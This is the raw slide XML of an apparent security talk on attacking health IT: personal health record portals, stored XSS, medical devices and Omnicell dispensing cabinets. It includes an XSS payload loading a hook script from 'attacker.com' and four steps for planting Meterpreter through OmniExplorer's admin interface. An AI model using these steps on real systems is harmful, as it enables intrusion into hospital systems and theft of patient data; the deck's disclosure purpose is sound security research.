          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Microsoft Health Vault</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Google Health (discontinued 1/1/12)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Various Others</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Usually bundled with existing practice management or EMR/EHR systems or health care specific CMS’s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Patient facing web portals that centralize patient record access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>text input by patient both structured and unstructured</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>file uploads, medical images and sometimes arbitrary file types</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>automated data upload from home medical/fitness devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>allows for bi-directional data flow between health care providers and patients</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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Microsoft</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health</a:t>
            </a:r>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vault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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(HV)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>good documentation, SDK, and development sandbox</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" baseline="30000" dirty="0" smtClean="0"/>
              <a:t>rd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> parties can create all kinds of web and rich applications that interface with the HV API</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>data storage can be entirely in HV or can reside in applications local database or other storage location</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>user must grant app access within main HV site</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>HV doesn’t seem to do much in the way of input validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>special characters seem to be appropriately encoded when displayed in HV proper</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>however, HV ends up being a great way to introduce stored XSS and other injection vectors to other consumers of the PHR data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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Malicious</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health</a:t>
            </a:r>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records</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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(MHR)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>MHR input get parsed and acted upon by backend health systems. Many vectors exist:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>XSS and all that enables…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0"/>
              <a:t>SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>You didn’t forget file uploads? DICOM, PDF, etc…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Systems effected:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>practice management/EMR/EHR systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>PACS systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>HL7 routers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>modalities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>PHR and other web users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>business partner and HIE connected systems?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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I</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got</a:t>
            </a:r>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mad</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alert</a:t>
            </a:r>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boxes</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yo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>None, to some, to solid filtering and encoding in PHRs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>The underachievers let us get away with murder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>&lt;script&gt;alert(1);&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>&lt;script </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>="http://attacker.com:3000/hook.js"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Docs sometimes have access to portals themselves, with access to multiple patients data…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Some PHRs incorporate additional functionality and local storage for scheduling, messaging, etc… and so on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>CSRF definitely a problem here too.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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even</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>trying</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>stored</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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xss</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 3" descr="xssed.png"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1565581" y="1412875"/>
            <a:ext cx="6012839" cy="4392613"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>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pwned</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in</a:t>
            </a:r>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the</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wild</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Content Placeholder 3" descr="inj3ct0r.PNG"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="667455" y="1412875"/>
            <a:ext cx="7809090" cy="4392613"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>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unintended</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consequences</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>That </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1" dirty="0" smtClean="0"/>
              <a:t>was</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> a PHR advertised in the HV application directory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Compromise of every HV account that was accessed after the attack is trivial.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Depending on the design of the app the attacker may have had access to every HV account that was still linked to HV and granted permissions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Grab those </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>PersonIDs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>RecordIDs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> and give it a shot…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>When this PHR is restored and patched do they just get to keep on using HV w/o consequence? Breach disclosure?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>hardware</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="2276872"/>
            <a:ext cx="7772400" cy="936104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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6800" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>On hard times</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6800" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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3188948868"/>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medical</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hardware</a:t>
            </a:r>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review</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Numerous bugs from the mundane to the exotic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Bedside devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Vital monitoring systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Infusion pumps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Prescription Dispensing Cabinets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Omnicell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Pyxis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Modalities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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omnicell</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omniexplorer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 3" descr="ini-edit.png"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2958182" y="1412875"/>
            <a:ext cx="3227637" cy="4392613"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>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omni</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exploder</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Omnicell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> uses West Wind Web Connect for a remote web viewer called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>OmniExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Doz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> @ http://www.hackerscenter.com alluded to an issue with the admin interface but didn’t spell it out, so here it is:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>http://hostname/wc.dll?wwMaint~EditConfig</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ExeFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>=C:\meterpreter.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>UpdateFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>=\\yourmachine\meterpreter.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>http://hostname/wc.dll?_maintain~UpdateExe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Get GUI access to interact directly with the logged in application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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death</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packets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Inevitably at the bar, somebody will ask for a death packet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>A: They exist and you already know about them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Some systems do not fail closed and their continued unmonitored or unregulated operation can be deadly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>radiation dosing systems, infusion pumps, etc…</a:t>
